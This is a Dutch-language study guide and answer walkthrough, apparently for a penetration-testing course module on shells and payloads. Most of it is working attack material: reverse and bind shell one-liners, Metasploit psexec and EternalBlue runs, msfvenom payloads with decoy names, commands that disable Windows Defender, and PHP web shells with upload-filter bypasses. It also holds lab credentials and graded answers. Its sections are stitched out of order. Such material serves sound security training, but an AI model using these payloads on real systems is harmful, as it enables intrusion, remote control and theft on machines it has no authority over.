# 5. Voer reverse shell uit (zie Stap 3 hierboven)

# 6. Zodra shell actief in Kali:
hostname

Antwoord: [De hostname die je ziet, bijv. WS01]
```

---

## 🛠️ Payloads Maken {#payloads}

### Analyse van Payload One-Liners

#### Linux (Bash) Bind Shell Breakdown

bash

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

**Stap-voor-stap:**

|Onderdeel|Wat het doet|
|---|---|
|`rm -f /tmp/f;`|Verwijder oude pipe voor schone lei|
|`mkfifo /tmp/f;`|Maak named pipe (digitale tunnel)|
|`cat /tmp/f \|`|Lees van tunnel|
|`/bin/bash -i`|Start interactieve Bash|
|`2>&1 \|`|Stuur errors ook door tunnel|
|`nc ... > /tmp/f`|Netcat schrijft naar tunnel|

#### PowerShell Reverse Shell Breakdown

powershell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);
$stream = $client.GetStream();
while(($i = $stream.Read(...)) -ne 0){
    $data = (New-Object ... ASCIIEncoding).GetString(...);
    $sendback = (iex $data 2>&1 | Out-String);
    ...
}
```

**Kernfunctionaliteit:**

|Stap|Beschrijving|
|---|---|
|**TCPClient**|Maakt verbinding met attack box|
|**GetStream**|Opent datastroom|
|**while loop**|Blijft draaien zolang verbinding open is|
|**iex**|Invoke-Expression - voert commando's uit|
|**sendback**|Stuurt resultaat terug|
|**PS prompt**|Toont `PS C:\>` in terminal|

### Metasploit Framework (MSF)

**Metasploit** is een framework dat exploitatie automatiseert.

#### Belangrijkste Component: Meterpreter

**Meterpreter voordelen:**

- ✅ Draait in geheugen (geen disk traces)
- ✅ Keylogging
- ✅ Screenshot maken
- ✅ File transfer
- ✅ Privilege escalation helpers
- ✅ Post-exploitation modules

#### Praktijkvoorbeeld: PSExec Module

bash

````bash
# 1. Start Metasploit
sudo msfconsole

# 2. Zoek module
search psexec

# 3. Selecteer module
use exploit/windows/smb/psexec

# 4. Configureer
set RHOSTS 10.129.180.71
set LHOST 10.10.14.222
set SMBUser htb-student
set SMBPass HTB_@cademy_stdnt!

# 5. Bekijk opties
show options

# 6. Exploit
exploit
```

**Wat gebeurt er:**
1. Verbindt met SMB-service
2. Authenticeert met credentials
3. Upload service executable
4. Stuurt Meterpreter "stage" naar geheugen
5. Opent `meterpreter >` prompt

### 🎓 Oefenvragen Antwoorden

**Vraag 1:** Welke interpreter start system-shell op target?
```
Antwoord: meterpreter
````

**Vraag 2:** Exploit target, vind bestand in Documents folder

bash

```bash
# In msfconsole:
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set LHOST tun0
set SMBUser htb-student
set SMBPass HTB_@cademy_stdnt!
exploit

# Eenmaal in Meterpreter:
shell
cd C:\Users\htb-student\Documents
dir

Antwoord: [De bestandsnaam die je ziet]
```

---

## 🔨 MSFvenom: Payloads Genereren {#msfvenom}

### Wat is MSFvenom?

**MSFvenom** = MSFpayload + MSFencode

Genereer een **executable bestand** dat een reverse/bind shell bevat.

### Staged vs Stageless Payloads

#### Staged Payloads (`/` in naam)

bash

```bash
windows/meterpreter/reverse_tcp
```

**Hoe het werkt:**

1. Kleine "stager" wordt eerst gestuurd
2. Stager haalt grote Meterpreter-code op via netwerk

**Voordelen:**

- ✅ Initiële payload is klein
- ✅ Nuttig bij exploits met weinig ruimte

**Nadelen:**

- ❌ Meer netwerkverkeer
- ❌ Kan opgemerkt worden

#### Stageless Payloads (`_` in naam)

bash

```bash
windows/meterpreter_reverse_tcp
```

**Hoe het werkt:**

- Hele payload in één keer in bestand

**Voordelen:**

- ✅ Stabieler bij slechte verbindingen
- ✅ Minder netwerkverkeer
- ✅ Soms makkelijker AV te omzeilen

### Payload Genereren - Linux

bash

```bash
# Linux ELF executable
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.10.14.113 \
  LPORT=443 \
  -f elf \
  > backup.elf

# Parameters:
# -p = payload type
# LHOST = jouw IP (waar target naartoe belt)
# LPORT = jouw poort
# -f = formaat (elf voor Linux)
# > = output naar bestand
```

### Payload Genereren - Windows

bash

```bash
# Windows EXE executable
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.113 \
  LPORT=443 \
  -f exe \
  > SalarisPlan.exe
```

### Listener voor Stageless Payload

bash

```bash
# Voor stageless payloads is Netcat genoeg:
sudo nc -lvnp 443

# Geen Metasploit multi/handler nodig!
```

### Handige MSFvenom Commando's

bash

```bash
# Alle payloads bekijken
msfvenom -l payloads

# Payload opties bekijken
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Alle formaten bekijken
msfvenom -l formats
```

### 📋 Formaten Overzicht

|Formaat|Gebruik|
|---|---|
|`exe`|Windows executable|
|`elf`|Linux executable|
|`dll`|Windows library|
|`aspx`|ASP.NET webshell|
|`war`|Java web application|
|`php`|PHP webshell|
|`py`|Python script|

---

## 💻 Windows Shells {#windows}

### Windows Identificatie (Fingerprinting)

#### Methode 1: TTL Check met Ping

bash

```bash
ping -c 1 <TARGET_IP>

# Windows TTL ≈ 128
# Linux TTL ≈ 64
```

**Waarom werkt dit?**

- Windows stuurt ICMP met TTL 128
- Linux gebruikt TTL 64

#### Methode 2: Nmap OS Detection

bash

```bash
sudo nmap -O <TARGET_IP>
```

### Windows Payload Types

|Type|Extensie|Gebruik|
|---|---|---|
|**EXE**|`.exe`|Standaard executable|
|**DLL**|`.dll`|Dynamic Link Library - DLL Hijacking|
|**Batch**|`.bat`|CMD script|
|**MSI**|`.msi`|Installer pakket - `msiexec`|
|**PowerShell**|`.ps1`|Meest krachtig - in-memory execution|

### Praktijkvoorbeeld: EternalBlue

**Kwetsbaarheid:** MS17-010 (CVE-2017-0144)

#### Stap 1: Vulnerability Scan

bash

```bash
msfconsole -q

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

# Output:
# [+] 10.129.x.x:445 - Host is likely VULNERABLE to MS17-010!
```

#### Stap 2: Exploit Kiezen

bash

```bash
# PSExec variant is stabieler dan standaard eternalblue
use exploit/windows/smb/ms17_010_psexec

set RHOSTS <TARGET_IP>
set LHOST tun0
show options
exploit
```

**Waarom PSExec?**

- ✅ Upload kleine service executable
- ✅ Minder memory race conditions
- ✅ Stabieler resultaat

### Windows Defender Omzeilen

powershell

````powershell
# Realtime protection uitschakelen (Admin PowerShell)
Set-MpPreference -DisableRealtimeMonitoring $true

# Status checken
Get-MpPreference | Select-Object DisableRealtimeMonitoring
```

**⚠️ Belangrijk:** Alleen in testomgevingen!

---

## 🐧 Linux/Unix Shells {#linux}

### Linux Dominantie op Web

**Statistiek:**
- 70%+ van webservers draait Linux/Unix
- Apache, Nginx, Tomcat meestal op Linux

### Typische Aanvalsketen
```
1. Web Application Exploit
   ↓
2. Limited Shell (www-data user)
   ↓
3. Privilege Escalation
   ↓
4. Root Access
````

### Interactieve Shell Spawnen

#### Waarom upgraden naar TTY?

**Non-TTY shell problemen:**

- ❌ Geen autocomplete
- ❌ Geen command history
- ❌ CTRL+C sluit hele verbinding
- ❌ Geen vi/vim editing

#### Methoden om TTY Shell te krijgen

bash

```bash
# Python (meest gebruikelijk)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Of Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# Perl
perl -e 'exec "/bin/bash";'

# Ruby
ruby -e 'exec "/bin/sh"'

# Lua
lua -e 'os.execute("/bin/sh")'
```

#### Creatieve Methoden

bash

```bash
# AWK
awk 'BEGIN {system("/bin/bash")}'

# Find
find . -exec /bin/bash \; -quit

# Vim (in editor)
:set shell=/bin/bash
:shell
```

### Fully Interactive Shell (Stabiel)

bash

```bash
# Stap 1: Spawn shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Stap 2: Background de shell
# Druk: CTRL+Z

# Stap 3: Op jouw terminal
stty raw -echo; fg

# Stap 4: Druk 2x Enter

# Nu heb je volledige terminal functionaliteit!
```

### Privilege Escalation Check

bash

```bash
# Check sudo rechten
sudo -l

#Voorbeeld gevaarlijke output:
# User www-data may run the following commands:
#     (ALL : ALL) NOPASSWD: ALL

# Dit betekent je kunt worden root:
sudo su
# of
sudo /bin/bash
```

### Linux Exploit Voorbeeld: rConfig

#### Vulnerability Scan

bash

```bash
msfconsole -q

use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
set RHOSTS <TARGET_IP>
set LHOST tun0
set VHOST <TARGET_IP>
exploit
```

#### Post-Exploitation

bash

````bash
# In Meterpreter:
shell

# Upgrade shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Check OS
cat /etc/os-release

# Check user
whoami
id

# Check sudo
sudo -l
```

### 🎓 Oefenvragen Antwoorden

**Vraag 1:** Welke taal gebruikt rConfig exploit?
```
Antwoord: PHP
Uitleg: rConfig is webapplicatie, exploit upload .php file
````

**Vraag 2:** Hostname van router in /devicedetails

bash

````bash
# Na exploit:
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /devicedetails
ls
cat [bestandsnaam]

# Zoek naar "hostname" in output
Antwoord: [De hostname uit het bestand]
```

---

## 🌐 Web Shells {#webshells}

### Wat is een Web Shell?

Een **web shell** is een script op de server dat commando's accepteert via HTTP en output toont in browser.

**Voorbeeld URL:**
```
http://target.com/shell.php?cmd=whoami
````

### Waarom Web Shells?

|Voordeel|Uitleg|
|---|---|
|**Poort 80/443**|Altijd open naar buitenwereld|
|**Foothold**|Eerste toegang bij extern onderzoek|
|**Geen Listener**|Interactie via browser|
|**Bypass Firewall**|HTTP traffic wordt toegestaan|

### Simpele PHP Web Shell

php

````php
<?php system($_GET['cmd']); ?>
```

**Hoe het werkt:**
1. Upload als `shell.php`
2. Ga naar: `http://site.com/shell.php?cmd=id`
3. Output: `uid=33(www-data) gid=33(www-data)`

### Upload Vectors

**Waar vind je upload mogelijkheden?**
```
✓ Profielfoto upload
✓ Bestandsbijlage in forums
✓ Admin panels (Tomcat, cPanel)
✓ CMS plugins (WordPress, Joomla)
✓ FTP met webroot toegang
````

### Web Shell Locaties op Kali

bash

```bash
# Overzicht beschikbare shells
ls /usr/share/webshells/

# PHP shells
ls /usr/share/webshells/php/

# ASP shells
ls /usr/share/webshells/aspx/

# Populaire: Laudanum
ls /usr/share/laudanum/
```

### Laudanum Web Shell (ASP.NET)

#### Setup

bash

````bash
# Kopieer naar werk directory
cp /usr/share/laudanum/aspx/shell.aspx ~/shell.aspx

# Edit bestand - pas regel 14 aan:
# Oude regel:
string password = ""; 

# Nieuwe regel:
string password = "HTB_@cademy_stdnt!";
```

#### Upload en Gebruik

1. Upload naar IIS server
2. Ga naar: `http://target.com/shell.aspx`
3. Voer password in
4. Typ commando's in veld

**⚠️ Let op:**
- Vaak onstabiel
- Bestanden kunnen verwijderd worden
- Gebruik als springplank voor reverse shell

### 🎓 Oefenvragen Antwoorden

**Vraag 1:** Locatie Laudanum op Parrot OS
```
Antwoord: /usr/share/laudanum
````

**Vraag 2:** Whoami output na shell upload

bash

```bash
# 1. Kopieer en edit shell:
cp /usr/share/laudanum/aspx/shell.aspx ~/shell.aspx
nano ~/shell.aspx
# Stel password in

# 2. Upload naar status.inlanefreight.local

# 3. Access shell en typ:
whoami

Antwoord: [Output van whoami, bijv. iis apppool\defaultapppool]
```

---

## 🔐 Antak Web Shell (Nishang) {#antak}

### Wat is Antak?

**Antak** is onderdeel van het Nishang framework.

- Bootst PowerShell console na in browser
- Draait in geheugen
- Kan commando's encoderen (bypass detectie)

### Locatie

bash

```bash
/usr/share/nishang/Antak-WebShell/antak.aspx
```

### Setup en Upload

#### Stap 1: Voorbereiding

bash

```bash
# Kopieer
cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/antak.aspx

# Edit bestand (rond regel 14):
nano ~/antak.aspx

# Verander:
$user = "admin"
$password = "admin"
```

#### Stap 2: Upload Bypass

**Probleem:** Server accepteert geen `.aspx`

**Oplossing:**

bash

````bash
# Hernoem
mv antak.aspx antak.aspx.zip

# Upload via browser
# Of via Burp Suite - intercept en wijzig Content-Type
```

#### Stap 3: Gebruik

1. Navigate: `http://status.inlanefreight.local/files/antak.aspx.zip`
2. Login: admin / admin
3. PowerShell console is nu actief!

### 🎓 Oefenvragen Antwoorden

**Vraag 1:** Locatie Antak webshell
```
Antwoord: /usr/share/nishang/Antak-WebShell
````

**Vraag 2:** Welke gebruiker voert commando's uit?

powershell

```powershell
# In Antak console:
whoami

Antwoord: iis apppool\status
```

---

## 📸 PHP Web Shells (Upload Bypass) {#php-bypass}

### Upload Restriction Bypass

**Scenario:** Server accepteert alleen afbeeldingen

### Burp Suite Methode

#### Stap 1: PHP Shell Voorbereiden

php

```php
<?php
system($_REQUEST['cmd']);
?>
```

#### Stap 2: Intercept met Burp

1. Zet Burp Proxy op Intercept ON
2. Upload `.php` bestand
3. Onderschep verzoek in Burp

#### Stap 3: Manipuleer Content-Type

**Voor:**

http

```http
Content-Type: application/x-php
```

**Na (verander naar):**

http

```http
Content-Type: image/gif
```

#### Stap 4: Forward en Test

bash

```bash
# Access shell:
http://target.com/images/vendor/yourshell.php?cmd=id
```

### GIF Magic Bytes Method

php

````php
GIF89a;
<?php
system($_REQUEST['cmd']);
?>
```

**Waarom werkt dit?**
- `GIF89a;` = Magic bytes van GIF
- Server denkt: "Dit is een afbeelding"
- PHP interpreter ziet: "Oh, PHP code!"

### 🎓 Oefenvragen Antwoorden

**Vraag 1:** Juiste Content-Type voor bypass
```
Antwoord: image/gif
````

**Vraag 2:** Bestandsnaam in /images/vendor

bash

````bash
# Na upload en shell toegang:
ls /images/vendor
# Of via web shell:
?cmd=ls /var/www/html/images/vendor

Antwoord: ajax-loader.gif
```

---

## 🛡️ Detectie & Preventie {#detectie}

### MITRE ATT&CK Framework

**Drie Cruciale Tactieken:**
```
┌─────────────────────────────────────────┐
│ 1. Initial Access                       │
│    → Web exploit, SMB vulnerability     │
├─────────────────────────────────────────┤
│ 2. Execution                            │
│    → PowerShell, Bash, Metasploit       │
├─────────────────────────────────────────┤
│ 3. Command & Control (C2)               │
│    → HTTP/HTTPS, DNS tunneling          │
└─────────────────────────────────────────┘
````

### Events to Monitor

|Event Type|Wat te Monitoren|
|---|---|
|**Bestandsuploads**|`.php`, `.aspx`, `.exe` in webdirs|
|**Verdachte Commando's**|`whoami`, `net user`, `wget`|
|**Netwerk Anomalieën**|Verbindingen naar poort 4444|
|**Processen**|`nc.exe`, `powershell.exe` met `-enc`|

### Netwerkdetectie

#### Deep Packet Inspection (DPI)

bash

````bash
# In Wireshark - filter op Netcat traffic
tcp.port == 4444

# Follow TCP Stream om commando's te zien
# Netcat shells zijn NIET encrypted!
```

**Voorbeeld detectie:**
```
USER: net user hacker password123 /add
OUTPUT: The command completed successfully.
````

### Endpoint Bescherming

#### Windows Defender

powershell

```powershell
# Status checken
Get-MpPreference | Select-Object DisableRealtimeMonitoring

# Scan history
Get-MpThreatDetection
```

**Houd aan:**

- ✅ Real-time protection
- ✅ Cloud-delivered protection
- ✅ Automatic sample submission

#### Patch Management

bash

````bash
# Linux - update check
sudo apt update
sudo apt list --upgradable

# Windows
Get-WindowsUpdate
```

### Verdedigingslagen (Defense in Depth)
```
┌──────────────────────────────────┐
│ 1. Network Firewall               │ ← Blokkeer poort 4444
├──────────────────────────────────┤
│ 2. IDS/IPS                        │ ← Detecteer exploit traffic
├──────────────────────────────────┤
│ 3. Application Firewall (WAF)     │ ← Stop web shell uploads
├──────────────────────────────────┤
│ 4. Endpoint Protection (AV)       │ ← Block malicious .exe
├──────────────────────────────────┤
│ 5. Application Sandboxing         │ ← Isoleer web server
├──────────────────────────────────┤
│ 6. Least Privilege                │ ← www-data, geen root
├──────────────────────────────────┤
│ 7. Segmentatie                    │ ← DMZ voor webservers
└──────────────────────────────────┘
```

### Best Practices

| Maatregel | Implementatie |
|-----------|---------------|
| **Least Privilege** | Gebruikers alleen noodzakelijke rechten |
| **Segmentatie** | Webservers in DMZ |
| **Hardening** | Onnodige services uitschakelen |
| **Monitoring** | SIEM voor log aggregatie |
| **Patching** | Maandelijkse update cyclus |

---

## 🎯 Skills Assessment {#assessment}

### Scenario

Je werkt voor **CAT5 Security**. Klant: **Inlanefreight**

**Opdracht:** Bewijs je skills voordat je bij live engagement mag.

### Netwerk Setup
```
┌───────────────────────────────────────────┐
│ Internet                                   │
│ 10.129.x.x (Jouw VPN)                     │
└─────────────┬─────────────────────────────┘
              │ RDP
              ▼
┌───────────────────────────────────────────┐
│ FOOTHOLD: 10.129.204.126                  │
│ Internal: 172.16.1.5                      │
│ (Parrot Linux)                            │
└─────────────┬─────────────────────────────┘
              │ Internal Network: 172.16.0.0/23
              │
    ┌─────────┼─────────┐
    ▼         ▼         ▼
┌────────┬────────┬────────┐
│Host-1  │Host-2  │Host-3  │
│.11     │.12     │.13     │
│Windows │Linux   │Windows │
│Tomcat  │Gabber  │SMB     │
└────────┴────────┴────────┘
````

### Verbinden met Foothold

bash

```bash
# Spawn target en noteer IP
xfreerdp /v:<FOOTHOLD_IP> /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution
```

### Host-1: Windows met Tomcat

**Vragen:**

1. Hostname?
2. Folder in `C:\Shares\`?

**Strategie:**

bash

```bash
# 1. Scan netwerk
nmap -sn 172.16.1.0/24

# 2. Scan Host-1
nmap -sV --script nbstat 172.16.1.11

# 3. Genereer WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > shell.war

# 4. Start listener
nc -lvnp 4444 &

# 5. Upload via browser
firefox http://172.16.1.11:8080/manager/html &
# Login: tomcat / Tomcatadm

# 6. In shell:
hostname
dir C:\Shares\
```

**Antwoorden:**

- Q1: `shells-winsvr`
- Q2: `dev-share`

### Host-2: Linux Gabber Blog

**Vragen:**

1. Welke Linux distro?
2. Welke taal gebruikt exploit 50064.rb?
3. Flag in `/customscripts/flag.txt`?

**Strategie:**

bash

```bash
# 1. Config DNS
echo "172.16.1.12 blog.inlanefreight.local" | sudo tee -a /etc/hosts

# 2. Haal credentials
curl http://blog.inlanefreight.local/data/config.ini | grep -A2 admin

# 3. Download exploit
searchsploit -m 50064

# 4. Metasploit
msfconsole -q
loadpath /home/htb-student/
search 50064
use 0
set RHOSTS blog.inlanefreight.local
set USERNAME admin
set PASSWORD admin123!@#
set VHOST blog.inlanefreight.local
set LHOST 172.16.1.5
set LPORT 4445
exploit

# 5. In shell:
cat /etc/os-release
cat /customscripts/flag.txt
```

**Antwoorden:**

- Q1: `ubuntu`
- Q2: `php`
- Q3: `[Je gevonden flag]`

### Host-3: Windows EternalBlue

**Vragen:**

1. Hostname?
2. Flag op Administrator Desktop?

**Strategie:**

bash

```bash
# 1. Vulnerability scan
msfconsole -q
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.16.1.13
run

# 2. Exploit
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.13
set LHOST 172.16.1.5
set LPORT 4446
exploit

# 3. In Meterpreter:
shell
hostname
type C:\Users\Administrator\Desktop\Skills-flag.txt
```

**Antwoorden:**

- Q1: `shells-winblue`
- Q2: `[Je gevonden flag]`

---

## 📖 Belangrijke Commando's Samenvatting

### Netwerk Scan

bash

```bash
# Host discovery
nmap -sn 172.16.1.0/24

# Service scan
nmap -sV -sC --top-ports 1000 <IP>

# OS detection
sudo nmap -O <IP>

# Vulnerability scan
nmap --script smb-vuln* -p445 <IP>
```

### Shell Verbindingen

bash

```bash
# Bind shell - listener op target
nc -lvnp 7777

# Bind shell - connect van attack box
nc -nv <TARGET_IP> 7777

# Reverse shell - listener op attack box
sudo nc -lvnp 443

# Bash reverse shell
bash -i >& /dev/tcp/<ATTACK_IP>/443 0>&1
```

### Payload Generatie

bash

```bash
# Windows executable
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe

# Linux executable
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf

# WAR voor Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f war > shell.war

# PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Metasploit

bash

```bash
# Start
msfconsole -q

# Module zoeken
search <keyword>

# Module gebruiken
use exploit/path/to/exploit

# Opties bekijken
show options

# Variabele instellen
set RHOSTS <IP>
set LHOST tun0
set LPORT 4444

# Exploit
exploit
```

### Shell Upgrade

bash

```bash
# Python TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Fully interactive
# 1. Spawn shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2. CTRL+Z
# 3. In eigen terminal:
stty raw -echo; fg
# 4. 2x Enter
```

---

## 🎓 Examenvragen Patronen

### Type 1: Identificatie

**Patroon:** "Welke ... draait op ...?"

**Aanpak:**

bash

```bash
# Altijd beginnen met:
nmap -sV <IP>
# Of in shell:
cat /etc/os-release  # Linux
systeminfo            # Windows
```

### Type 2: Locatie

**Patroon:** "Waar is ... op Pwnbox?"

**Aanpak:**

bash

````bash
locate <keyword>
# Of:
find /usr/share -name "*keyword*"
```

### Type 3: Exploitatie + Flag

**Patroon:** "Exploit ... en vind flag in ..."

**Stappen:**
1. Scan → Vind kwetsbaarheid
2. Exploit → Krijg shell
3. Navigate → `cd /path/to/flag`
4. Read → `cat flag.txt`

---

## ✅ Checklist voor Succes

### Pre-Exploit

- [ ] VPN verbonden (`ping 10.10.10.10`)
- [ ] Foothold bereikbaar (`ping <FOOTHOLD_IP>`)
- [ ] RDP werkt
- [ ] Intern netwerk bereikbaar (`ping 172.16.1.11`)
- [ ] DNS geconfigureerd (`/etc/hosts`)
- [ ] Tools beschikbaar (`which nmap msfvenom nc`)

### During Exploit

- [ ] Juiste LHOST (172.16.1.5, NIET 10.x.x.x)
- [ ] Poort >1024 (of gebruik sudo)
- [ ] Listener actief voordat payload draait
- [ ] Shell geüpgraded naar TTY (indien nodig)
- [ ] Commando's getest (`whoami`, `hostname`)

### Post-Exploit

- [ ] Screenshots van alle flags
- [ ] Command history opgeslagen
- [ ] Antwoorden genoteerd
- [ ] Cleanup uitgevoerd (optioneel)

---

## 🔑 Belangrijkste Lessen

### 1. LHOST = Intern IP bij Pivoting
```
❌ FOUT: LHOST=10.10.14.x (VPN IP)
✅ GOED: LHOST=172.16.1.5 (Foothold intern)
```

### 2. Reverse Shell > Bind Shell

**Waarom:**
- Firewalls blokkeren inkomend
- Uitgaand meestal toegestaan
- 95% van de tijd beter

### 3. Stabiliteit van Shell
```
Netcat < Web Shell < Meterpreter < Fully Interactive TTY
````

### 4. Altijd Upgraden

bash

```bash
# Eerste actie in limited shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 5. Defense in Depth

**Geen enkele beveiliging is perfect:**

- Firewall + IDS + AV + Least Privilege = Sterke verdediging

---

## 📚 Handige Resources

### Cheat Sheets

- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/) - Linux privilege escalation
- [LOLBAS](https://lolbas-project.github.io/) - Windows living off the land

### Video's

- [IppSec](https://ippsec.rocks/) - HTB machine walkthroughs
- [John Hammond](https://www.youtube.com/@_JohnHammond) - CTF & pentesting

### Tools

- [Nishang](https://github.com/samratashok/nishang) - PowerShell exploits
- [Laudanum](https://sourceforge.net/projects/laudanum/) - Web shells
- [Netcat](https://nmap.org/ncat/) - Swiss army knife

---

**Einde Module**
Shells pluggen ons in, Payloads leveren ons Shells
Wat is een Shell?

Een shell is een programma dat een computergebruiker een interface biedt om instructies in het systeem in te voeren en tekstuitvoer te bekijken (bijvoorbeeld Bash, Zsh, cmd en PowerShell). Voor penetratietesters en informatiebeveiligers is een shell vaak het resultaat van het misbruiken van een kwetsbaarheid of het omzeilen van beveiligingsmaatregelen om interactieve toegang tot een host te verkrijgen. Je hebt vast wel eens zinnen gehoord als:

    "Ik heb een shell gevangen." (I caught a shell.)

    "Ik heb een shell gepopt!" (I popped a shell!)

    "Ik ben in een shell gedropt!"

    "Ik ben binnen!"

Meestal betekenen deze uitspraken dat de persoon met succes een kwetsbaarheid op een systeem heeft misbruikt en op afstand controle heeft gekregen over de shell van het besturingssysteem op de doelcomputer. Dit is een veelvoorkomend doel van een penetratietester. Het grootste deel van deze module zal zich richten op wat er gebeurt na de enumeratie en de identificatie van veelbelovende exploits.
Waarom een Shell verkrijgen?

Vergeet niet dat de shell ons directe toegang geeft tot het OS, de systeemcommando's en het bestandssysteem. Zodra we toegang hebben, kunnen we het systeem gaan onderzoeken (enumereren) op vectoren die ons in staat stellen om rechten te escaleren (privilege escalation), door te dringen naar andere systemen (pivoting), bestanden over te dragen en meer. Zonder een shell-sessie zijn we zeer beperkt in hoe ver we kunnen komen op een doelsysteem.

Het opzetten van een shell stelt ons ook in staat om persistence (toegang behouden) op het systeem te verkrijgen, waardoor we meer tijd hebben om te werken. Het maakt het eenvoudiger om onze aanvalstools te gebruiken, gegevens te exfiltreren en alle details van onze aanval te verzamelen en te documenteren.

Belangrijk is dat een shell bijna altijd betekent dat we toegang hebben tot de CLI (Command Line Interface) van het OS. Dit is vaak lastiger op te merken dan wanneer we op afstand een grafische shell via VNC of RDP zouden gebruiken. Bovendien is de CLI sneller in navigatie en makkelijker te automatiseren.
Shell Perspectieven
Perspectief	Beschrijving
Computing	De tekstgebaseerde omgeving die wordt gebruikt om taken te beheren en instructies in te dienen op een pc. Denk aan Bash, Zsh, cmd en PowerShell.
Exploitation & Security	Een shell is vaak het resultaat van het exploiteren van een kwetsbaarheid. Een voorbeeld is het triggeren van EternalBlue op een Windows-host om op afstand toegang te krijgen tot de cmd-prompt.
Web	Een web shell is vergelijkbaar, maar misbruikt een kwetsbaarheid (vaak de mogelijkheid om een bestand of script te uploaden) waardoor de aanvaller instructies kan geven via een browser.
Payloads leveren ons Shells

Binnen de IT-sector kan een 'payload' op verschillende manieren worden gedefinieerd:

    Netwerken: Het ingekapselde datagedeelte van een pakket dat over computernetwerken reist.

    Basisinformatica: Het gedeelte van een instructieset dat de uit te voeren actie definieert (zonder headers en protocolinformatie).

    Programmeren: Het datagedeelte waarnaar wordt verwezen door een instructie in de programmeertaal.

    Exploitation & Security: Een payload is code die is ontwikkeld met de intentie om een kwetsbaarheid op een computersysteem te misbruiken. De term payload kan verschillende soorten malware beschrijven, waaronder ransomware.

In deze module werken we met veel verschillende soorten payloads en leveringsmethoden om toegang te krijgen tot hosts en externe shell-sessies op te zetten met kwetsbare systemen.

Voorbereiding op de opdracht van CAT5 Security

Je bent een penetratietester die werkt voor CAT5 Security, en je bereidt je voor op een opdracht voor onze klant, Inlanefreight. De senior teamleden van CAT5 willen onze vaardigheden met shells & payloads zien voordat ze ons betrekken bij de live opdracht.

De eindbeoordeling van deze module bestaat uit een reeks uitdagingen die CAT5 Security heeft opgezet om onze vaardigheden te testen. Het voltooien van deze uitdagingen betekent dat je bent geslaagd voor de evaluatie.
Onderdelen van de evaluatie:

    Shell-basis:

        Het reproduceren van een Bind Shell op een Linux-host.

        Het reproduceren van een Reverse Shell op een Windows-host.

    Payload-basis:

        Demonstreer het lanceren van een payload vanuit MSF (Metasploit Framework).

        Demonstreer het zoeken naar en bouwen van een payload op basis van een PoC (Proof of Concept) op ExploitDB.

        Demonstreer kennis over het creëren van payloads.

    Een Shell verkrijgen op Windows:

        Gebruik de verstrekte verkenningsresultaten (recon) om een payload te maken of te gebruiken die de host exploiteert en een shell terugstuurt.

    Een Shell verkrijgen op Linux:

        Gebruik de verstrekte verkenningsresultaten om een payload te maken of te gebruiken om de host te exploiteren en een shell-sessie op te zetten.

    Een Web Shell plaatsen:

        Toon kennis aan van web shells en veelvoorkomende webapplicaties door een applicatie en de bijbehorende programmeertaal te identificeren.

        Gebruik de verkenningsresultaten om een payload in te zetten die shell-toegang biedt via je browser.

    Een Shell of Payload detecteren:

        Detecteer de aanwezigheid van een payload of interactieve shell op een host door de verstrekte relevante informatie te analyseren.

    Einduitdaging:

        Gebruik de opgedane kennis uit de vorige secties om een payload te selecteren, te maken en in te zetten om toegang te krijgen tot de geleverde hosts. Zodra een shell is verkregen, verzamel je de gevraagde informatie om de vragen van de uitdaging te beantwoorden.

Inhoudsopgave

    Introductie

    Shell-basis

    Payloads

    Windows Shells

    NIX (*nix/Linux) Shells

    Web Shells

    Vaardigheidstoets (Skills Assessment)

    Aanvullende overwegingen
Anatomie van een Shell

Elk besturingssysteem heeft een shell. Om hiermee te communiceren, moeten we een applicatie gebruiken die bekendstaat als een terminal emulator. Hier zijn enkele van de meest voorkomende terminal emulators:
Terminal Emulator	Besturingssysteem
Windows Terminal	Windows
cmder	Windows
PuTTY	Windows
Alacritty	Windows, Linux en MacOS
xterm	Linux
GNOME Terminal	Linux
Konsole	Linux
Terminal	MacOS
iTerm2	MacOS

Deze lijst is zeker niet volledig, maar bevat de belangrijkste opties. Omdat veel van deze tools open-source zijn, kunnen ze vaak ook op andere systemen worden geïnstalleerd. De keuze voor een terminal emulator is vooral een kwestie van persoonlijke voorkeur en workflow. Op een doelsysteem ben je echter vaak afhankelijk van wat er standaard (nativief) aanwezig is.
Command Language Interpreters

Net zoals een menselijke tolk gesproken taal of gebarentaal in real-time vertaalt, is een command language interpreter een programma dat de instructies van de gebruiker interpreteert en deze doorgeeft aan het besturingssysteem.

Wanneer we spreken over command-line interfaces, bedoelen we de combinatie van:

    Het besturingssysteem (OS)

    De Terminal Emulator (de applicatie)

    De Command Language Interpreter (de taalverwerker)

Veel van deze interpreters worden ook wel shell scripting talen genoemd. In de MITRE ATT&CK Matrix vallen ze onder de techniek "Command and Scripting Interpreters". Hoe beter je deze talen begrijpt, hoe succesvoller je zult zijn in het exploiteren van systemen.
